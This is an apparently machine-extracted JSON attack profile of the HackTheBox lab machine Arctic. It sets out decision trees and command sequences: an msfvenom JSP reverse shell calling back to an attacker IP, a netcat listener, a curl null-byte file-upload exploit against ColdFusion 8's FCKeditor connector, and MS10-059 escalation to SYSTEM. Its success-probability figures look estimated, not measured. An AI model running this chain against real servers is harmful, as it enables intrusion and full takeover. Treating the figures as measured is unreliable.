{
  "writeup_id": "Htb_Arctic",
  "scenario_fingerprint": {
    "scenario_name": "windows_coldfusion_legacy_exploitation",
    "primary_services": [
      "http",
      "msrpc"
    ],
    "port_signature": "135+8500+49154",
    "service_combination": "http+msrpc",
    "os_family": "windows_server",
    "environment_type": "legacy_web_server",
    "entry_vector": "coldfusion_file_upload",
    "privilege_path": "web_shell_to_system",
    "attack_complexity": "easy",
    "estimated_time": "60-90 minutes",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "coldfusion_8_version",
      "directory_listing_enabled",
      "cfide_administrator_exposed",
      "slow_response_times"
    ],
    "environmental_clues": [
      "jrun_web_server",
      "cfide_directory_structure",
      "legacy_coldfusion_installation",
      "windows_rpc_services"
    ],
    "similar_scenarios": [
      "legacy_web_applications",
      "windows_iis_exploitation"
    ],
    "unique_aspects": [
      "30_second_response_delay",
      "coldfusion_8_specific_vulns",
      "unauthenticated_file_upload_available",
      "ms10_059_privilege_escalation"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "ColdFusion Directory Traversal",
        "success_reason": "ColdFusion 8 vulnerable to directory traversal allowing file system access",
        "prerequisite_indicators": [
          "coldfusion_service_running",
          "version_8_identified",
          "cfide_directory_accessible"
        ],
        "recognition_patterns": [
          "JRun Web Server header",
          "CFIDE and cfdocs directories present",
          "ColdFusion administrator login page",
          "Version 8 identified in interface"
        ],
        "failure_modes": [
          "patched_coldfusion_version",
          "cfide_directory_restricted",
          "file_system_permissions_hardened"
        ],
        "environmental_factors": [
          "legacy_coldfusion_installation",
          "default_configuration_maintained",
          "insufficient_security_updates"
        ],
        "success_probability": 0.92,
        "typical_timeframe": "10-20 minutes"
      },
      {
        "technique": "ColdFusion File Upload",
        "success_reason": "Unauthenticated file upload vulnerability in ColdFusion 8",
        "prerequisite_indicators": [
          "coldfusion_8_running",
          "file_upload_functionality_present",
          "insufficient_upload_restrictions"
        ],
        "recognition_patterns": [
          "cfm file extensions accepted",
          "jsp upload capability",
          "web shell execution possible"
        ],
        "failure_modes": [
          "file_type_restrictions_enforced",
          "upload_directory_not_executable",
          "antivirus_blocking_uploads"
        ],
        "environmental_factors": [
          "default_upload_permissions",
          "web_directory_writable",
          "execution_permissions_enabled"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "15-30 minutes"
      },
      {
        "technique": "MS10-059 Privilege Escalation",
        "success_reason": "Unpatched Windows system vulnerable to MS10-059 exploit",
        "prerequisite_indicators": [
          "windows_system_identified",
          "missing_security_patches",
          "user_shell_obtained"
        ],
        "recognition_patterns": [
          "Windows version susceptible to MS10-059",
          "systeminfo shows missing patches",
          "exploit compatibility confirmed"
        ],
        "failure_modes": [
          "patches_applied",
          "exploit_mitigation_enabled",
          "insufficient_user_privileges"
        ],
        "environmental_factors": [
          "legacy_windows_installation",
          "patch_management_neglected",
          "default_security_settings"
        ],
        "success_probability": 0.88,
        "typical_timeframe": "5-10 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "ColdFusion 8 installation",
        "discovery_method": "Port enumeration and web interface analysis",
        "why_critical": "Version 8 has multiple known vulnerabilities for RCE",
        "how_to_recognize": [
          "TCP 8500 with JRun Web Server",
          "CFIDE directory structure",
          "Administrator login showing version",
          "Directory listing enabled"
        ],
        "follow_up_actions": [
          "search_for_cf8_exploits",
          "attempt_directory_traversal",
          "test_file_upload_vulnerabilities",
          "enumerate_administrator_hash"
        ]
      },
      {
        "discovery": "Slow response times indicating resource constraints",
        "discovery_method": "Network timing analysis during enumeration",
        "why_critical": "Indicates potential for DoS and suggests limited monitoring",
        "how_to_recognize": [
          "30+ second response times",
          "Connection timeouts with multiple requests",
          "Resource exhaustion symptoms"
        ],
        "follow_up_actions": [
          "limit_concurrent_requests",
          "use_single_threaded_tools",
          "focus_on_high_value_targets"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "web_shell_user",
        "escalation_method": "MS10-059_kernel_exploit",
        "why_possible": "Legacy Windows system missing critical security patches",
        "recognition_signs": [
          "windows_version_vulnerable_to_ms10-059",
          "missing_kb982799_patch",
          "user_context_sufficient_for_exploit"
        ],
        "exploitation_path": "File Upload → Web Shell → MS10-059 → SYSTEM"
      },
      {
        "privilege_level": "unauthenticated",
        "escalation_method": "coldfusion_rce_to_system",
        "why_possible": "Multiple ColdFusion 8 RCE vulnerabilities available",
        "recognition_signs": [
          "cf8_directory_traversal_works",
          "file_upload_unrestricted",
          "administrator_hash_accessible"
        ],
        "exploitation_path": "Directory Traversal → Hash Extraction → Admin Access → File Upload → RCE"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 135,8500,49154 open on Windows host",
        "decision": "Investigate port 8500 as potential web service",
        "reasoning": "Port 8500 commonly used by ColdFusion webserver, RPC ports indicate Windows",
        "confidence": 0.8,
        "alternatives": [
          {
            "option": "rpc_enumeration",
            "when": "if web service fails"
          },
          {
            "option": "smb_enumeration",
            "when": "if standard ports found"
          }
        ],
        "success_indicators": [
          "http_response_received",
          "web_server_identified",
          "directory_listing_found"
        ],
        "next_decision": "identify_web_application_type"
      },
      {
        "step": 2,
        "situation": "Confirmed ColdFusion 8 webserver with admin interface",
        "decision": "Search for ColdFusion 8 specific vulnerabilities",
        "reasoning": "ColdFusion 8 has known critical vulnerabilities including file upload and directory traversal",
        "confidence": 0.95,
        "prerequisites": [
          "coldfusion_version_identified",
          "admin_interface_found"
        ],
        "success_indicators": [
          "exploit_database_matches_found",
          "vulnerability_confirmed"
        ],
        "failure_fallbacks": [
          "credential_bruteforce",
          "directory_enumeration",
          "default_credentials"
        ]
      },
      {
        "step": 3,
        "situation": "Multiple ColdFusion 8 exploits available",
        "decision": "Try unauthenticated file upload exploit first",
        "reasoning": "File upload requires no credentials and provides direct code execution",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "directory_traversal",
            "when": "if file upload blocked"
          },
          {
            "option": "hash_disclosure",
            "when": "if need admin access"
          },
          {
            "option": "authentication_bypass",
            "when": "if admin panel required"
          }
        ],
        "success_indicators": [
          "file_uploaded_successfully",
          "code_execution_achieved"
        ],
        "next_decision": "establish_persistent_shell"
      }
    ],
    "branching_logic": {
      "if_file_upload_succeeds": {
        "action": "upload_webshell_and_execute",
        "tools": [
          "msfvenom",
          "metasploit",
          "custom_jsp_shell"
        ],
        "next_phase": "privilege_escalation_enumeration"
      },
      "if_file_upload_fails": {
        "action": "try_hash_disclosure_attack",
        "purpose": "obtain_admin_credentials",
        "tools": [
          "directory_traversal_exploit",
          "hashcat"
        ],
        "next_step": "authenticated_file_upload"
      },
      "if_shell_obtained": {
        "action": "enumerate_windows_privileges",
        "purpose": "find_privilege_escalation_vectors",
        "tools": [
          "systeminfo",
          "whoami",
          "windows_exploit_suggester"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "prioritize_unauthenticated_rce_over_credential_attacks",
        "reasoning": "direct_code_execution_faster_than_credential_cracking",
        "applicability": "web_application_vulnerabilities"
      },
      {
        "rule": "check_exploit_db_immediately_after_version_identification",
        "reasoning": "known_vulnerabilities_more_reliable_than_generic_attacks",
        "applicability": "identified_software_versions"
      },
      {
        "rule": "use_kernel_exploits_for_windows_privilege_escalation",
        "reasoning": "older_windows_systems_vulnerable_to_kernel_exploits",
        "applicability": "windows_hosts_with_shell_access"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "ColdFusion Directory Traversal",
        "mitre_id": "T1083",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          8500,
          80,
          443
        ],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "coldfusion_webserver_detected",
          "cfide_directory_accessible",
          "version_8_or_vulnerable"
        ],
        "success_indicators": [
          "cfide_administrator_accessible",
          "directory_listing_enabled",
          "slow_response_times_30s"
        ],
        "incompatible_with": [
          "coldfusion_patched",
          "directory_traversal_blocked",
          "web_application_firewall"
        ],
        "confidence_boosters": [
          "jrun_web_server_banner",
          "cfide_cfdocs_directories",
          "administrator_login_page"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "10-20 minutes"
      },
      {
        "technique": "ColdFusion File Upload",
        "mitre_id": "T1105",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          8500,
          80,
          443
        ],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "coldfusion_webserver_detected",
          "unauthenticated_upload_endpoint",
          "jsp_execution_enabled"
        ],
        "success_indicators": [
          "file_upload_form_accessible",
          "jsp_files_accepted",
          "uploaded_files_executable"
        ],
        "incompatible_with": [
          "file_upload_restrictions",
          "authentication_required",
          "file_type_filtering"
        ],
        "confidence_boosters": [
          "default_coldfusion_configuration",
          "version_8_detected",
          "administrator_panel_accessible"
        ],
        "typical_success_rate": 0.78,
        "estimated_time": "15-30 minutes"
      },
      {
        "technique": "MS10-059 Privilege Escalation",
        "mitre_id": "T1068",
        "required_services": [],
        "required_ports": [],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "windows_server_2008_or_older",
          "unpatched_system",
          "initial_shell_access"
        ],
        "success_indicators": [
          "vulnerable_windows_version",
          "missing_security_patches",
          "system_service_exploitable"
        ],
        "incompatible_with": [
          "ms10_059_patch_installed",
          "windows_server_2012_or_newer",
          "enhanced_security_configuration"
        ],
        "confidence_boosters": [
          "old_windows_server_version",
          "missing_windows_updates",
          "default_service_configuration"
        ],
        "typical_success_rate": 0.92,
        "estimated_time": "5-10 minutes"
      }
    ],
    "environmental_detectors": {
      "coldfusion_webserver": {
        "port_indicators": [
          8500,
          80,
          443
        ],
        "service_indicators": [
          "http",
          "https",
          "fmtp"
        ],
        "banner_indicators": [
          "JRun Web Server",
          "ColdFusion",
          "CFIDE"
        ],
        "path_indicators": [
          "/CFIDE/",
          "/cfdocs/",
          "/CFIDE/administrator/"
        ],
        "confidence_threshold": 0.9
      },
      "windows_server": {
        "port_indicators": [
          135,
          445,
          49154
        ],
        "service_indicators": [
          "msrpc",
          "smb"
        ],
        "banner_indicators": [
          "Microsoft Windows RPC",
          "Windows Server"
        ],
        "confidence_threshold": 0.85
      },
      "web_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443,
          8500
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "apache",
          "nginx",
          "iis",
          "jrun"
        ],
        "confidence_threshold": 0.9
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "coldfusion_directory_traversal",
          "when": "coldfusion_detected_and_cfide_accessible",
          "reason": "high_success_rate_known_vulnerability"
        },
        {
          "attack": "coldfusion_file_upload",
          "when": "coldfusion_administrator_accessible",
          "reason": "direct_code_execution_capability"
        }
      ],
      "medium_priority": [
        {
          "attack": "ms10_059_privilege_escalation",
          "when": "windows_shell_obtained_and_old_version",
          "reason": "reliable_privilege_escalation_method"
        },
        {
          "attack": "web_directory_enumeration",
          "when": "web_service_detected_with_slow_responses",
          "reason": "directory_listing_often_enabled"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "ColdFusion File Upload RCE",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "msfvenom",
            "command_template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jsp",
            "actual_command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.47 LPORT=443 -f raw > shell.jsp",
            "output_pattern": "Payload size: {size} bytes",
            "effectiveness_rating": 5,
            "reliability": 0.9
          },
          {
            "name": "curl",
            "command_template": "curl -X POST -F 'newfile=@{payload_file}' '{target}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}%00'",
            "actual_command": "curl -X POST -F 'newfile=@shell.jsp' 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/shell.jsp%00'",
            "success_factors": [
              "fckeditor_accessible",
              "file_upload_enabled"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "coldfusion_8_accessible",
          "fckeditor_directory_exists",
          "file_upload_functionality_enabled"
        ],
        "success_indicators": [
          "upload_completed_response",
          "payload_accessible_via_get_request",
          "reverse_shell_connection_established"
        ],
        "common_failures": [
          "fckeditor_directory_not_found",
          "file_type_restrictions",
          "network_connectivity_issues",
          "payload_detection_by_av"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "local_enumeration",
          "persistence_establishment"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "ColdFusion Directory Traversal",
        "mitre_id": "T1083",
        "category": "discovery",
        "phase": "reconnaissance",
        "tools_used": [
          {
            "name": "searchsploit",
            "command_template": "searchsploit {application_name}",
            "actual_command": "searchsploit coldfusion",
            "output_pattern": "Exploit Title | Path",
            "effectiveness_rating": 4,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "coldfusion_server_identified",
          "version_information_available"
        ],
        "success_indicators": [
          "file_system_access_achieved",
          "sensitive_files_readable",
          "configuration_files_accessible"
        ],
        "common_failures": [
          "path_restrictions_in_place",
          "insufficient_permissions",
          "file_not_found_errors"
        ],
        "follow_up_techniques": [
          "credential_extraction",
          "configuration_analysis",
          "privilege_escalation"
        ],
        "time_investment": "10-30 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Windows Privilege Escalation MS10-059",
        "mitre_id": "T1068",
        "category": "privilege_escalation",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "ms10-059_exploit",
            "command_template": "ms10-059.exe",
            "actual_command": "ms10-059.exe",
            "success_factors": [
              "vulnerable_windows_version",
              "exploit_compatibility"
            ],
            "effectiveness_rating": 5,
            "reliability": 0.85
          }
        ],
        "prerequisites": [
          "windows_system_access",
          "vulnerable_windows_version",
          "exploit_upload_capability"
        ],
        "success_indicators": [
          "system_level_privileges_obtained",
          "administrator_access_confirmed",
          "full_system_control_achieved"
        ],
        "common_failures": [
          "system_already_patched",
          "exploit_incompatibility",
          "antivirus_detection",
          "insufficient_initial_privileges"
        ],
        "follow_up_techniques": [
          "credential_dumping",
          "persistence_establishment",
          "lateral_movement"
        ],
        "time_investment": "5-20 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "msfvenom",
        "use_case": "jsp_payload_generation",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "web_application_exploitation"
        ],
        "alternatives": [
          "manual_jsp_shell_creation",
          "weevely"
        ],
        "best_practices": [
          "use_common_ports_for_reverse_shells",
          "test_payload_locally_first",
          "consider_payload_size_limitations"
        ]
      },
      {
        "tool": "searchsploit",
        "use_case": "vulnerability_research",
        "effectiveness_rating": 4,
        "reliability": 0.9,
        "learning_curve": "low",
        "essential_for": [
          "exploit_development",
          "vulnerability_assessment"
        ],
        "alternatives": [
          "manual_cve_research",
          "metasploit_search"
        ],
        "best_practices": [
          "cross_reference_version_numbers",
          "read_exploit_code_before_use",
          "verify_exploit_applicability"
        ]
      },
      {
        "tool": "curl",
        "use_case": "http_exploitation",
        "effectiveness_rating": 4,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "web_application_testing"
        ],
        "alternatives": [
          "burp_suite",
          "wget",
          "python_requests"
        ],
        "best_practices": [
          "use_proper_content_type_headers",
          "handle_slow_responses_appropriately",
          "verify_upload_success_before_triggering"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "coldfusion_unauthenticated_rce",
        "steps": [
          {
            "step": 1,
            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.47 LPORT=443 -f raw > shell.jsp",
            "purpose": "Generate JSP reverse shell payload",
            "expected_output": "Payload size: 1496 bytes"
          },
          {
            "step": 2,
            "command": "nc -nlvp 443",
            "purpose": "Start reverse shell listener",
            "expected_output": "Listening on port 443"
          },
          {
            "step": 3,
            "command": "curl -X POST -F 'newfile=@shell.jsp' 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/shell.jsp%00'",
            "purpose": "Upload malicious JSP file",
            "expected_output": "OnUploadCompleted response"
          },
          {
            "step": 4,
            "command": "curl http://10.10.10.11:8500/userfiles/file/shell.jsp",
            "purpose": "Trigger uploaded payload",
            "expected_output": "Reverse shell connection established"
          }
        ],
        "success_rate": 0.85,
        "typical_duration": "10-20 minutes"
      },
      {
        "sequence_name": "windows_privilege_escalation_ms10059",
        "steps": [
          {
            "step": 1,
            "command": "systeminfo",
            "purpose": "Enumerate system information",
            "expected_output": "Windows version and patch level"
          },
          {
            "step": 2,
            "command": "upload ms10-059.exe",
            "purpose": "Transfer privilege escalation exploit",
            "expected_output": "File uploaded successfully"
          },
          {
            "step": 3,
            "command": "ms10-059.exe",
            "purpose": "Execute privilege escalation exploit",
            "expected_output": "System level shell obtained"
          }
        ],
        "success_rate": 0.8,
        "typical_duration": "5-15 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Arctic",
      "difficulty": "Easy",
      "os": "Windows",
      "platform": "HackTheBox",
      "release_date": "2017-03-22",
      "author": "ch4p",
      "estimated_time": "60-90 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "low",
      "skill_level_required": "beginner",
      "primary_attack_vectors": [
        "web_application",
        "file_upload",
        "privilege_escalation"
      ],
      "key_vulnerabilities": [
        "coldfusion_file_upload",
        "ms10_059",
        "unauthenticated_access"
      ],
      "environment_type": "web_server",
      "real_world_relevance": "medium",
      "learning_value": [
        "coldfusion_exploitation",
        "windows_privilege_escalation",
        "legacy_system_attacks"
      ],
      "prerequisite_knowledge": [
        "basic_web_enumeration",
        "file_upload_attacks",
        "windows_exploits"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "file_upload",
        "privilege_escalation",
        "legacy_systems"
      ],
      "attack_types": [
        "initial_access",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "patch_management",
        "secure_file_uploads",
        "service_hardening"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Devel",
        "Grandpa",
        "Granny"
      ],
      "similarity_reasons": [
        "windows_web_server",
        "file_upload_vulnerability",
        "ms_privilege_escalation"
      ],
      "unique_aspects": [
        "coldfusion_platform",
        "network_latency_simulation",
        "dual_attack_paths"
      ],
      "difficulty_factors": [
        "slow_response_times",
        "straightforward_exploit_chain",
        "well_known_vulnerabilities"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T00:04:38.844966",
    "original_file": "0xdf_writeups/Htb Arctic.md",
    "content_length": 30705,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}